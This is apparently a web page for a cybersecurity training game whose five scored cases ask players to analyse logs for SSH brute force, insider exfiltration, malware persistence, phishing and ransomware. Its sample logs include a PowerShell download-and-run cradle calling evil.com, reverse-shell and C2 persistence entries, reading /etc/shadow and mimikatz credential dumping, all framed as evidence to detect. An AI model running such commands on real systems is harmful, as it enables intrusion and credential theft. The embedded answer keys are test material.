<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>FORENSICS LAB // CASE ROOM</title>
<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=VT323&display=swap" rel="stylesheet">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#02070d;color:#00e8ff;font-family:'Share Tech Mono',monospace;min-height:100vh;overflow-x:hidden}
a{color:#00e8ff;text-decoration:none}
.back{position:fixed;top:16px;left:16px;z-index:100;font-family:'VT323',monospace;font-size:20px;padding:6px 14px;border:1px solid #00e8ff;background:rgba(0,232,255,.08);transition:.3s}
.back:hover{background:#00e8ff;color:#02070d}
h1{font-family:'VT323',monospace;font-size:48px;text-align:center;padding:30px 0 6px;text-shadow:0 0 20px #00e8ff}
.sub{text-align:center;color:#ff2bd6;font-family:'VT323',monospace;font-size:22px;margin-bottom:20px}
.sbar{text-align:center;font-family:'VT323',monospace;font-size:20px;color:#00ff9c;margin-bottom:10px}
.ctr{max-width:980px;margin:0 auto;padding:0 20px 60px}
.nav{display:flex;gap:8px;justify-content:center;flex-wrap:wrap;margin-bottom:24px}
.nb{font-family:'VT323',monospace;font-size:18px;padding:8px 16px;background:rgba(0,232,255,.06);border:1px solid #00e8ff33;color:#00e8ff55;cursor:not-allowed;transition:.3s}
.nb.u{border-color:#00e8ff;color:#00e8ff;cursor:pointer}
.nb.a{background:#00e8ff;color:#02070d}
.nb.d{border-color:#00ff9c;color:#00ff9c}
.nb.d.a{background:#00ff9c;color:#02070d}
.pnl{display:none;border:1px solid #00e8ff33;padding:20px;background:rgba(0,232,255,.03)}
.pnl.v{display:block}
.br{border-left:3px solid #ff2bd6;padding:10px 16px;margin-bottom:18px;color:#ff2bd6;font-size:14px;background:rgba(255,43,214,.05)}
.row{font-size:13px;padding:8px 10px;border:1px solid transparent;margin:3px 0;cursor:pointer;transition:.2s;overflow-x:auto}
.row:hover{border-color:#00e8ff55;background:rgba(0,232,255,.05)}
.row.sel{border-color:#ff2bd6;background:rgba(255,43,214,.1)}
.row.ok{border-color:#00ff9c;background:rgba(0,255,156,.1)}
.row.bad{border-color:#f00;background:rgba(255,0,0,.1)}
.btn{font-family:'VT323',monospace;font-size:22px;padding:10px 30px;background:transparent;border:2px solid #ff2bd6;color:#ff2bd6;cursor:pointer;margin-top:16px;transition:.3s;display:block;width:100%}
.btn:hover{background:#ff2bd6;color:#02070d}
.fb{margin-top:16px;padding:14px;border:1px solid #00ff9c;background:rgba(0,255,156,.05);display:none;font-size:13px;line-height:1.6}
.fb.show{display:block}
.fb.fail{border-color:#f00;background:rgba(255,0,0,.05)}
.les{color:#00ff9c;margin-top:8px;font-style:italic}
.opts{margin:10px 0}
.opts label{display:block;padding:6px 10px;cursor:pointer;border:1px solid transparent;margin:3px 0;font-size:13px}
.opts label:hover{border-color:#00e8ff33}
.opts input{margin-right:8px}
.hdr{color:#00e8ff88;font-size:12px;margin-bottom:6px;padding:4px}
.ev{border:1px solid #00e8ff22;padding:10px;margin:8px 0;font-size:12px;white-space:pre-wrap;line-height:1.5}
.scanline{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:9999;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,232,255,.015) 2px,rgba(0,232,255,.015) 4px)}
</style>
</head>
<body>
<div class="scanline"></div>
<a href="/CyberWorld/" class="back">&lt; BACK TO CYBERWORLD</a>
<h1>FORENSICS LAB</h1>
<div class="sub">// CASE ROOM //</div>
<div class="ctr">
<div class="sbar">TOTAL SCORE: <span id="ts">0</span>/500</div>
<div class="nav" id="nav"></div>
<div id="panels"></div>
</div>
<script>
const K='cw.forensics.v1';
let S=JSON.parse(localStorage.getItem(K)||'null')||{scores:[0,0,0,0,0],unlocked:1,done:[]};
const sv=()=>localStorage.setItem(K,JSON.stringify(S));
const tot=()=>document.getElementById('ts').textContent=S.scores.reduce((a,b)=>a+b,0);

function mk(p,t){const r=document.createElement('div');r.className='row';r.textContent=t;p.appendChild(r);return r}
function tog(s,i,r){if(s.has(i)){s.delete(i);r.classList.remove('sel')}else{s.add(i);r.classList.add('sel')}}
function fbk(p,sc,msg,lesson){const f=p.querySelector('.fb');f.innerHTML=(sc>=60?'<span style="color:#00ff9c">':'<span style="color:#f00">')+`Score: ${sc}/100</span><br>${msg}<br><span class="les">LESSON: ${lesson}</span>`;f.className='fb show'+(sc>=60?'':' fail');p.locked=true}

const CASES=[
// CASE 1: UNAUTHORIZED ACCESS
{t:"CASE 1: UNAUTHORIZED ACCESS",b:"Review these authentication logs from the past 24 hours. Identify the attacker IP, the compromised account, and select the correct timeline of events.",
build(p){
const logs=[
'2026-06-07 02:14:01 sshd: Failed password for admin from 10.0.1.50 port 22',
'2026-06-07 02:14:03 sshd: Failed password for admin from 10.0.1.50 port 22',
'2026-06-07 02:14:05 sshd: Failed password for admin from 10.0.1.50 port 22',
'2026-06-07 08:30:00 sshd: Accepted password for jdoe from 192.168.1.100 port 22',
'2026-06-07 14:22:11 sshd: Failed password for root from 203.0.113.42 port 22',
'2026-06-07 14:22:13 sshd: Failed password for root from 203.0.113.42 port 22',
'2026-06-07 14:22:15 sshd: Failed password for admin from 203.0.113.42 port 22',
'2026-06-07 14:22:17 sshd: Failed password for svc_backup from 203.0.113.42 port 22',
'2026-06-07 14:22:19 sshd: Accepted password for svc_backup from 203.0.113.42 port 22',
'2026-06-07 14:23:01 sudo: svc_backup : TTY=pts/0 ; COMMAND=/bin/cat /etc/shadow',
'2026-06-07 14:23:45 sshd: Accepted password for svc_backup from 203.0.113.42 port 22',
'2026-06-07 14:24:02 scp: svc_backup downloaded /etc/shadow to remote host'
];
const d=p.querySelector('.data');
d.innerHTML='<div class="hdr">AUTH LOGS - SERVER: PROD-WEB-01</div>';
logs.forEach((t,i)=>mk(d,`[${i}] ${t}`));

const opts=document.createElement('div');opts.className='opts';
opts.innerHTML=`<p style="color:#ff2bd6;margin:12px 0 6px">Attacker IP:</p>
<label><input type="radio" name="c1ip" value="a"> 10.0.1.50</label>
<label><input type="radio" name="c1ip" value="b"> 192.168.1.100</label>
<label><input type="radio" name="c1ip" value="c"> 203.0.113.42</label>
<p style="color:#ff2bd6;margin:12px 0 6px">Compromised Account:</p>
<label><input type="radio" name="c1acct" value="a"> admin</label>
<label><input type="radio" name="c1acct" value="b"> svc_backup</label>
<label><input type="radio" name="c1acct" value="c"> root</label>
<p style="color:#ff2bd6;margin:12px 0 6px">Attack Timeline:</p>
<label><input type="radio" name="c1tl" value="a"> Brute force root -> brute force admin -> compromise svc_backup -> privilege escalation -> data exfiltration</label>
<label><input type="radio" name="c1tl" value="b"> Compromise admin -> lateral movement -> data exfiltration</label>
<label><input type="radio" name="c1tl" value="c"> Social engineering -> password spray -> compromise root</label>`;
d.after(opts);
return()=>{
const ip=p.querySelector('input[name="c1ip"]:checked');
const acct=p.querySelector('input[name="c1acct"]:checked');
const tl=p.querySelector('input[name="c1tl"]:checked');
if(!ip||!acct||!tl)return;
let sc=0;if(ip.value==='c')sc+=34;if(acct.value==='b')sc+=33;if(tl.value==='a')sc+=33;
S.scores[0]=sc;
fbk(p,sc,'Attacker IP: 203.0.113.42 (external). Compromised account: svc_backup (service account with weak password). Timeline: brute-forced root/admin, then svc_backup succeeded, used sudo to read /etc/shadow, then exfiltrated it via SCP.','Service accounts are prime targets - they often have weak passwords and excessive privileges. Monitor failed auth attempts, enforce account lockout policies, and use key-based SSH authentication.');
return sc;
}}},

// CASE 2: DATA EXFIL
{t:"CASE 2: DATA EXFILTRATION",b:"Review firewall and file access logs. Flag suspicious outbound connections, identify the insider, and estimate data volume.",
build(p){
const d=p.querySelector('.data');
d.innerHTML=`<div class="hdr">FIREWALL LOGS</div>`;
const fwLogs=[
'06-07 09:00 ALLOW TCP 192.168.1.15 -> 8.8.8.8:443 (google.com) 2.1MB',
'06-07 09:15 ALLOW TCP 192.168.1.15 -> 104.16.0.0:443 (slack.com) 450KB',
'06-07 11:30 ALLOW TCP 192.168.1.22 -> 185.199.0.0:443 (github.com) 1.2MB',
'06-07 13:00 ALLOW TCP 192.168.1.22 -> 45.33.32.156:443 (mega.nz) 856MB',
'06-07 13:45 ALLOW TCP 192.168.1.22 -> 45.33.32.156:443 (mega.nz) 1.2GB',
'06-07 14:00 ALLOW TCP 192.168.1.22 -> 45.33.32.156:443 (mega.nz) 340MB',
'06-07 16:00 ALLOW TCP 192.168.1.15 -> 13.107.0.0:443 (outlook.com) 890KB',
'06-07 17:00 ALLOW TCP 192.168.1.30 -> 151.101.0.0:443 (reddit.com) 3.4MB'
];
const fwAns=[3,4,5];let fwSel=new Set();
fwLogs.forEach((t,i)=>{const r=mk(d,`[${i}] ${t}`);r.onclick=()=>{if(p.locked)return;tog(fwSel,i,r)}});

d.innerHTML+=`<div class="hdr" style="margin-top:16px">FILE ACCESS LOGS - USER: m.chen (192.168.1.22)</div>`;
const faLogs=[
'06-07 10:00 m.chen READ /projects/client-data/contracts.zip',
'06-07 10:30 m.chen READ /projects/client-data/financials-2026.xlsx',
'06-07 11:00 m.chen COPY /projects/client-data/* -> /home/m.chen/staging/',
'06-07 12:00 m.chen ARCHIVE /home/m.chen/staging/ -> /home/m.chen/upload.tar.gz (2.4GB)'
];
faLogs.forEach(t=>{const e=document.createElement('div');e.className='ev';e.textContent=t;d.appendChild(e)});

const opts=document.createElement('div');opts.className='opts';
opts.innerHTML=`<p style="color:#ff2bd6;margin:12px 0 6px">Insider threat:</p>
<label><input type="radio" name="c2who" value="a"> Unknown external actor</label>
<label><input type="radio" name="c2who" value="b"> m.chen (192.168.1.22)</label>
<label><input type="radio" name="c2who" value="c"> User at 192.168.1.15</label>
<p style="color:#ff2bd6;margin:12px 0 6px">Estimated exfiltrated volume:</p>
<label><input type="radio" name="c2vol" value="a"> ~50MB</label>
<label><input type="radio" name="c2vol" value="b"> ~2.4GB</label>
<label><input type="radio" name="c2vol" value="c"> ~5GB</label>`;
d.after(opts);
return()=>{
const who=p.querySelector('input[name="c2who"]:checked');
const vol=p.querySelector('input[name="c2vol"]:checked');
if(!who||!vol||!fwSel.size)return;
const fwHits=fwAns.filter(x=>fwSel.has(x)).length;const fp=fwSel.size-fwHits;
let sc=Math.round((fwHits/3)*40-fp*10);
if(who.value==='b')sc+=30;
if(vol.value==='b')sc+=30;
sc=Math.max(0,Math.min(100,sc));S.scores[1]=sc;
const rows=p.querySelectorAll('.row');fwAns.forEach(i=>rows[i].classList.add('ok'));
fwSel.forEach(i=>{if(!fwAns.includes(i))rows[i].classList.add('bad')});
fbk(p,sc,'Suspicious connections: #3, #4, #5 - massive uploads to mega.nz (cloud storage) totaling ~2.4GB from m.chen\'s workstation. File logs confirm m.chen staged and archived 2.4GB of client data before uploading.','Monitor for large outbound transfers to cloud storage services. Correlate network logs with file access logs. DLP solutions can detect and block sensitive data exfiltration.');
return sc;
}}},

// CASE 3: MALWARE PERSISTENCE
{t:"CASE 3: MALWARE PERSISTENCE",b:"Examine these registry entries and scheduled tasks from a compromised Windows host. Identify the malicious scheduled task and registry key.",
build(p){
const d=p.querySelector('.data');
d.innerHTML='<div class="hdr">SCHEDULED TASKS</div>';
const tasks=[
'GoogleUpdateTaskMachineCore  | C:\\Program Files\\Google\\Update\\GoogleUpdate.exe /c | SYSTEM | Daily 09:00',
'MicrosoftEdgeUpdateTaskMachineUA | C:\\Program Files\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe /ua | SYSTEM | Hourly',
'WindowsDefenderScheduledScan | C:\\ProgramData\\Microsoft\\Windows Defender\\MpCmdRun.exe -Scan | SYSTEM | Daily 02:00',
'SystemHealthCheck | C:\\Users\\Public\\Downloads\\svchost.exe -b 203.0.113.42:4444 | SYSTEM | Every 5 min',
'AdobeAcrobatUpdateTask | C:\\Program Files\\Adobe\\Acrobat\\AdobeARM.exe | Current User | Weekly'
];
const taskAns=3;let taskSel=new Set();
tasks.forEach((t,i)=>{const r=mk(d,`[T${i}] ${t}`);r.onclick=()=>{if(p.locked)return;taskSel.clear();d.querySelectorAll('.row').forEach(x=>x.classList.remove('sel'));taskSel.add(i);r.classList.add('sel')}});

const regDiv=document.createElement('div');regDiv.innerHTML='<div class="hdr" style="margin-top:16px">REGISTRY RUN KEYS (HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run)</div>';
d.after(regDiv);
const regs=[
'SecurityHealth     | C:\\Windows\\System32\\SecurityHealthSystray.exe',
'iTunesHelper       | C:\\Program Files\\iTunes\\iTunesHelper.exe',
'WindowsUpdate      | C:\\Users\\Public\\AppData\\Local\\Temp\\winupdate.exe -persist -c2 evil-c2.net',
'VMware User Process| C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe',
'RealTimeSync       | C:\\Program Files\\FreeFileSync\\RealTimeSync.exe'
];
const regAns=2;let regSel=new Set();
regs.forEach((t,i)=>{const r=mk(regDiv,`[R${i}] ${t}`);r.onclick=()=>{if(p.locked)return;regSel.clear();regDiv.querySelectorAll('.row').forEach(x=>x.classList.remove('sel'));regSel.add(i);r.classList.add('sel')}});

return()=>{
if(!taskSel.size||!regSel.size)return;
let sc=0;
if(taskSel.has(taskAns))sc+=50;
if(regSel.has(regAns))sc+=50;
S.scores[2]=sc;
const tRows=d.querySelectorAll('.row');tRows[taskAns].classList.add(taskSel.has(taskAns)?'ok':'bad');
const rRows=regDiv.querySelectorAll('.row');rRows[regAns].classList.add(regSel.has(regAns)?'ok':'bad');
fbk(p,sc,'Task T3: "SystemHealthCheck" runs svchost.exe from Public\\Downloads (wrong path!) connecting to 203.0.113.42:4444 (reverse shell) every 5 minutes. Registry R2: "WindowsUpdate" runs winupdate.exe from Temp folder with -persist -c2 flags connecting to evil-c2.net.','Malware persistence indicators: executables in unusual paths (Downloads, Temp, Public), filenames mimicking system processes (svchost.exe, winupdate.exe), outbound connections to suspicious IPs/domains, and high-frequency scheduled execution.');
return sc;
}}},

// CASE 4: PHISHING CAMPAIGN
{t:"CASE 4: PHISHING CAMPAIGN",b:"Review these 5 email headers. Flag the 2 phishing emails and identify the red flags in each.",
build(p){
const d=p.querySelector('.data');
const emails=[
{id:0,h:`From: hr-notifications@company.com
To: all-staff@company.com
Subject: Updated PTO Policy - Effective July 2026
Return-Path: hr-notifications@company.com
SPF: PASS  DKIM: PASS  DMARC: PASS
X-Originating-IP: 10.0.1.50 (internal mail server)`,phish:false},
{id:1,h:`From: it-security@c0mpany.com
To: jdoe@company.com
Subject: URGENT: Your password expires in 2 hours - Click here to reset
Return-Path: bounce@mail-relay-293.ru
SPF: FAIL  DKIM: FAIL  DMARC: FAIL
X-Originating-IP: 185.234.72.19
Link: http://company-password-reset.evil-site.com/login`,phish:true},
{id:2,h:`From: aws-billing@amazon.com
To: cloud-team@company.com
Subject: AWS Invoice for June 2026
Return-Path: aws-billing@amazon.com
SPF: PASS  DKIM: PASS  DMARC: PASS
X-Originating-IP: 54.240.0.0 (Amazon SES)`,phish:false},
{id:3,h:`From: ceo@company.com
To: finance@company.com
Subject: Wire Transfer Needed ASAP - Confidential
Return-Path: ceo-urgent@protonmail.com
SPF: FAIL  DKIM: NONE  DMARC: FAIL
X-Originating-IP: 91.234.100.42
Reply-To: ceo-personal@gmail.com`,phish:true},
{id:4,h:`From: jira@atlassian.net
To: dev-team@company.com
Subject: [JIRA] PROJ-1234 updated by Mike S.
Return-Path: jira@atlassian.net
SPF: PASS  DKIM: PASS  DMARC: PASS
X-Originating-IP: 104.192.143.0 (Atlassian)`,phish:false}
];
let sel=new Set();
emails.forEach(e=>{
const card=document.createElement('div');card.className='ev';card.style.cursor='pointer';card.textContent=`[EMAIL ${e.id}]\n${e.h}`;
card.onclick=()=>{if(p.locked)return;if(sel.has(e.id)){sel.delete(e.id);card.style.borderColor='#00e8ff22'}else{sel.add(e.id);card.style.borderColor='#ff2bd6'}};
d.appendChild(card);
});
return()=>{
if(!sel.size)return;
const ans=[1,3];
const hits=ans.filter(x=>sel.has(x)).length;const fp=sel.size-hits;
const sc=Math.max(0,Math.round((hits/2)*100-fp*25));S.scores[3]=sc;
fbk(p,sc,`Email #1: Domain spoofing (c0mpany.com vs company.com), SPF/DKIM/DMARC all FAIL, Return-Path from .ru domain, urgency tactics, suspicious link to evil-site.com. Email #3: BEC (Business Email Compromise) - spoofed CEO, Return-Path from protonmail, SPF/DKIM fail, Reply-To different gmail, urgency + wire transfer request.`,'Check SPF/DKIM/DMARC results, compare From and Return-Path domains, look for lookalike domains (0 vs o), urgency language, unusual requests (wire transfers), and mismatched Reply-To addresses.');
return sc;
}}},

// CASE 5: RANSOMWARE RESPONSE
{t:"CASE 5: RANSOMWARE RESPONSE",b:"Review endpoint logs from a ransomware incident. Identify patient zero, the lateral movement path, the initial vector, and select the correct IR steps.",
build(p){
const d=p.querySelector('.data');
d.innerHTML='<div class="hdr">ENDPOINT DETECTION LOGS - INCIDENT TIMELINE</div>';
const logs=[
'06-07 08:45 WS-PC-031 (Sales) | Outlook opened attachment: Invoice_June.docm',
'06-07 08:46 WS-PC-031 (Sales) | Word macro executed PowerShell: IEX(New-Object Net.WebClient).DownloadString("http://evil.com/stage2.ps1")',
'06-07 08:47 WS-PC-031 (Sales) | New process: C:\\Users\\Public\\beacon.exe (unsigned)',
'06-07 08:50 WS-PC-031 (Sales) | Credential dump: mimikatz detected - LSASS memory access',
'06-07 08:52 WS-PC-031 (Sales) | SMB connection to FILE-SVR-01 using domain admin creds',
'06-07 08:53 FILE-SVR-01       | PsExec execution from WS-PC-031, beacon.exe copied',
'06-07 08:55 FILE-SVR-01       | SMB connection to DC-01 using domain admin creds',
'06-07 08:56 DC-01             | PsExec execution from FILE-SVR-01, beacon.exe copied',
'06-07 09:00 DC-01             | GPO modified: pushed ransomware.exe to all domain computers',
'06-07 09:05 MULTIPLE HOSTS    | File encryption detected: .locked extension appended'
];
logs.forEach(t=>{const e=document.createElement('div');e.className='ev';e.textContent=t;d.appendChild(e)});

const opts=document.createElement('div');opts.className='opts';
opts.innerHTML=`<p style="color:#ff2bd6;margin:12px 0 6px">Patient Zero:</p>
<label><input type="radio" name="c5pz" value="a"> FILE-SVR-01</label>
<label><input type="radio" name="c5pz" value="b"> WS-PC-031</label>
<label><input type="radio" name="c5pz" value="c"> DC-01</label>
<p style="color:#ff2bd6;margin:12px 0 6px">Initial Vector:</p>
<label><input type="radio" name="c5iv" value="a"> Phishing email with malicious Word macro</label>
<label><input type="radio" name="c5iv" value="b"> Exploited public-facing RDP</label>
<label><input type="radio" name="c5iv" value="c"> Supply chain compromise</label>
<p style="color:#ff2bd6;margin:12px 0 6px">Lateral Movement Path:</p>
<label><input type="radio" name="c5lm" value="a"> WS-PC-031 -> DC-01 -> FILE-SVR-01</label>
<label><input type="radio" name="c5lm" value="b"> WS-PC-031 -> FILE-SVR-01 -> DC-01</label>
<label><input type="radio" name="c5lm" value="c"> DC-01 -> FILE-SVR-01 -> WS-PC-031</label>
<p style="color:#ff2bd6;margin:12px 0 6px">Correct first IR steps (in order):</p>
<label><input type="radio" name="c5ir" value="a"> Pay ransom -> restore from backup -> patch systems</label>
<label><input type="radio" name="c5ir" value="b"> Isolate affected systems -> preserve evidence -> assess scope -> begin containment</label>
<label><input type="radio" name="c5ir" value="c"> Wipe all systems immediately -> reinstall from scratch</label>`;
d.after(opts);
return()=>{
const pz=p.querySelector('input[name="c5pz"]:checked');
const iv=p.querySelector('input[name="c5iv"]:checked');
const lm=p.querySelector('input[name="c5lm"]:checked');
const ir=p.querySelector('input[name="c5ir"]:checked');
if(!pz||!iv||!lm||!ir)return;
let sc=0;if(pz.value==='b')sc+=25;if(iv.value==='a')sc+=25;if(lm.value==='b')sc+=25;if(ir.value==='b')sc+=25;
S.scores[4]=sc;
fbk(p,sc,'Patient zero: WS-PC-031 (Sales workstation). Initial vector: phishing email with malicious Word macro (Invoice_June.docm). Lateral path: WS-PC-031 -> FILE-SVR-01 -> DC-01 (via PsExec + stolen domain admin creds). IR steps: isolate, preserve evidence, assess scope, then contain. Never pay ransom first or wipe evidence.','Ransomware kill chains typically follow: initial access -> execution -> credential theft -> lateral movement -> domain dominance -> deployment. The first IR priority is always containment and evidence preservation.');
return sc;
}}},
];

const nav=document.getElementById('nav'),pnls=document.getElementById('panels');
CASES.forEach((c,i)=>{
const btn=document.createElement('button');btn.className='nb';btn.textContent=`CASE ${i+1}`;btn.id=`nb${i}`;
btn.onclick=()=>show(i);nav.appendChild(btn);
const p=document.createElement('div');p.className='pnl';p.id=`p${i}`;
p.innerHTML=`<div class="br"><strong>${c.t}</strong><br>${c.b}</div><div class="data"></div><button class="btn">[ SUBMIT FINDINGS ]</button><div class="fb"></div>`;
pnls.appendChild(p);
const fn=c.build(p);
if(S.done.includes(i))p.locked=true;
p.querySelector('.btn').onclick=()=>{
if(p.locked)return;
const sc=fn();if(sc===undefined)return;
if(sc>=50&&!S.done.includes(i)){S.done.push(i);if(S.unlocked<=i+1)S.unlocked=i+2}
sv();ui();
};
});
function show(i){if(i>=S.unlocked)return;document.querySelectorAll('.pnl').forEach(p=>p.classList.remove('v'));document.querySelectorAll('.nb').forEach(b=>b.classList.remove('a'));document.getElementById(`p${i}`).classList.add('v');document.getElementById(`nb${i}`).classList.add('a')}
function ui(){tot();document.querySelectorAll('.nb').forEach((b,i)=>{b.classList.toggle('u',i<S.unlocked);b.classList.toggle('d',S.done.includes(i))})}
ui();show(0);
</script>
